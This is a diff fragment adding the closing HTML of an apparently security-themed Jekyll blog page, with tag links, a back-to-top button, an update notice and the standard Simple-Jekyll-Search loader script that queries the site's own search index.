+        <a class="post-tag btn btn-outline-primary" href="/tags/ato/">ATO</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/hacking-lab/">hacking-lab</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/note-taking/">note-taking</a>
+      
+    </div>
+  </section>
+
+
+    </div>
+    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
+  </div>
+</div>
+
+      </div>
+
+      <aside aria-label="Scroll to Top">
+        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
+          <i class="fas fa-angle-up"></i>
+        </button>
+      </aside>
+    </div>
+
+    <div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div>
+
+    
+      <aside
+  id="notification"
+  class="toast"
+  role="alert"
+  aria-live="assertive"
+  aria-atomic="true"
+  data-bs-animation="true"
+  data-bs-autohide="false"
+>
+  <div class="toast-header">
+    <button
+      type="button"
+      class="btn-close ms-auto"
+      data-bs-dismiss="toast"
+      aria-label="Close"
+    ></button>
+  </div>
+  <div class="toast-body text-center pt-0">
+    <p class="px-2 mb-3">A new version of content is available.</p>
+    <button type="button" class="btn btn-primary" aria-label="Update">
+      Update
+    </button>
+  </div>
+</aside>
+
+    
+
+    <!-- Embedded scripts -->
+
+    
+      
+      <!-- The comments switcher -->
+
+
+    
+
+    <!--
+  Jekyll Simple Search loader
+  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
+-->
+
+
+
+
+
+<script>
+  
+  document.addEventListener('DOMContentLoaded', () => {
+    SimpleJekyllSearch({
+      searchInput: document.getElementById('search-input'),
+      resultsContainer: document.getElementById('search-results'),
+      json: '/assets/js/data/search.json',
+      searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{content}</p>  </article>',
+      noResultsText: '<p class="mt-5">Oops! No results found.</p>',
+      templateMiddleware: function(prop, value, template) {
+        if (prop === 'categories') {
+          if (value === '') {
+            return `${value}`;
+          } else {
+            return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
+          }
+        }
+
+        if (prop === 'tags') {
+          if (value === '') {
+            return `${value}`;
+          } else {
+            return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
+          }
+        }
+      }
+    });
+  });
+</script>
+
+  </body>
+</html>
+
